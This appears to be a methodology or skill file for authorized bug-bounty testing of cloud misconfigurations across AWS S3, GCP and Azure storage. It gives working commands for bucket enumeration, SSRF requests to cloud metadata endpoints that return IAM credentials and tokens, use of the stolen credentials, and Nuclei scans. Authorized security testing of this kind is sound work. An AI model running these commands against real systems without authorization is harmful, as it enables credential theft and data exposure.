---
name: cloud-misconfiguration
description: "Cloud misconfiguration methodology for authorized security testing. Covers: AWS S3 bucket enumeration and permission testing (ACL, policy, no-sign-request), AWS IAM credential theft via SSRF to metadata (IMDSv1/v2), GCP cloud storage enumeration, GCP metadata endpoint, Azure blob storage enumeration, Azure IMDS, Nuclei cloud templates. High-tier bounty ceiling (data exposure, stored XSS at CDN scale). New vertical with high automation potential."
trigger_keywords: "cloud misconfiguration, s3 bucket, aws s3, bucket enumeration, aws metadata, ec2 metadata, iam credentials, imds, imdsv1, imdsv2, gcp storage, azure blob, cloud storage, bucket takeover, aws bucket, 169.254.169.254, metadata endpoint, cloud recon, s3 public, bucket acl"
version: 1.0
created: 2026-02-25
owner: cyber-operator
---

# Cloud Misconfiguration (S3 / GCP / Azure)

## Purpose

Identify and exploit misconfigured cloud storage and identity services. High automation potential — integrates with existing recon pipeline. High bounty ceiling (data exposure). New vertical.

---

## AWS S3 — Bucket Discovery

```bash
# From HTTP responses — extract S3 URLs
grep -oP 'https?://[a-zA-Z0-9.-]+\.s3\.amazonaws\.com' page_source.html
grep -oP 'https?://s3\.amazonaws\.com/[a-zA-Z0-9.-]+' page_source.html

# From DNS — CNAME → S3
dig CNAME assets.target.com  # → target-assets.s3.amazonaws.com

# Common naming patterns to enumerate:
# target, target-prod, target-staging, target-dev, target-backup
# target-uploads, target-assets, target-static, target-media
# target-logs, target-data, target-internal, www.target.com
```

---

## AWS S3 — Permission Testing

```bash
# List bucket (public read)
aws s3 ls s3://target-bucket --no-sign-request

# Download a file (for evidence only — single non-sensitive file)
aws s3 cp s3://target-bucket/readme.txt . --no-sign-request

# Check ACL
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request

# Check policy
aws s3api get-bucket-policy --bucket target-bucket --no-sign-request

# Authenticated access (any valid AWS account — may expose AuthenticatedUsers grants)
aws s3 ls s3://target-bucket
```

**ACL Permission Risk:**

| Grant | Risk Level |
|---|---|
| `AllUsers: READ` | Public data exposure |
| `AllUsers: WRITE` | Public write (upload malicious content) |
| `AllUsers: FULL_CONTROL` | Complete compromise |
| `AuthenticatedUsers: READ` | Any AWS account can read |
| `AuthenticatedUsers: WRITE` | Any AWS account can write |

---

## AWS IAM — Metadata SSRF

If you have SSRF into EC2 (via Host header, URL redirect, file inclusion):

```bash
# IMDSv1 (legacy — simple GET)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]
# Returns: AccessKeyId, SecretAccessKey, Token

# IMDSv2 (requires PUT token first — harder via basic SSRF)
# Step 1 via SSRF: PUT to metadata with X-aws-ec2-metadata-token-ttl-seconds: 21600
# Step 2: Use returned token in X-aws-ec2-metadata-token header
```

**Using stolen credentials:**
```bash
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

aws sts get-caller-identity   # Verify identity (safe, read-only)
aws s3 ls                      # List accessible buckets
# STOP HERE for bug bounty — do NOT enumerate IAM, enumerate users, etc.
```

---

## GCP Cloud Storage

```bash
# List bucket contents
curl "https://storage.googleapis.com/storage/v1/b/BUCKET_NAME/o"
curl "https://storage.googleapis.com/BUCKET_NAME/"

# gsutil
gsutil ls gs://target-bucket
gsutil cp gs://target-bucket/file.txt .

# GCP Metadata (SSRF required, requires Metadata-Flavor header)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/"
```

---

## Azure Blob Storage

```bash
# List blobs in a container (if public)
curl "https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list"

# Azure IMDS (SSRF required)
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

---

## Nuclei Cloud Templates

```bash
# S3 + cloud misconfiguration scanning
nuclei -l targets.txt -t cloud/aws/ -severity medium,high,critical
nuclei -l live-hosts.txt -tags cloud,aws,gcp,azure -o cloud-findings.txt

# Bucket takeover templates
nuclei -l subdomains.txt -tags takeovers
```

---

## Recon Pipeline Integration

1. Passive recon output (`passive-recon.md`) → extract domains
2. crt.sh subdomains → check for `*.s3.amazonaws.com` CNAMEs
3. Source map recon → extract S3 URLs from JS bundles
4. Nuclei cloud templates → automated permission check
5. Manual confirmation → ACL/policy review

---

## Evidence Standards

- Public read: List output + download one file (non-sensitive). Describe data types exposed.
- Public write: Show ACL/policy proving write access. Do NOT upload files. Describe impact.
- SSRF to metadata: `aws sts get-caller-identity` output only. Do NOT enumerate further without explicit program permission.

*cloud-misconfiguration.md v1.0 | owner: cyber-operator | 2026-02-25*
